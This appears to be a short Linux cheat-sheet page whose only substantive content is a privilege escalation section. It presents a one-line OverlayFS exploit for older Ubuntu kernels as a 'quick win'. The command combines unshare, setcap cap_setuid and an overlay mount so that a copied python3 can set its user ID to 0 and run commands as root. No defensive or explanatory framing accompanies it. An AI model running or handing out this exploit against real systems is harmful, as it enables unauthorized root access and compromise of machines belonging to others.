---
title: "Linux HandBook"
date: 2024-07-31
draft: false
summary: "This is a linux cheatsheet handbook"
tags: ["Linux", "cheatsheet"]
---

## Privilege Escalation

### Quick Wins
For older ubuntu kernels, this exploit is always worth trying

```bash
# Quick Wins
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("id")'
```
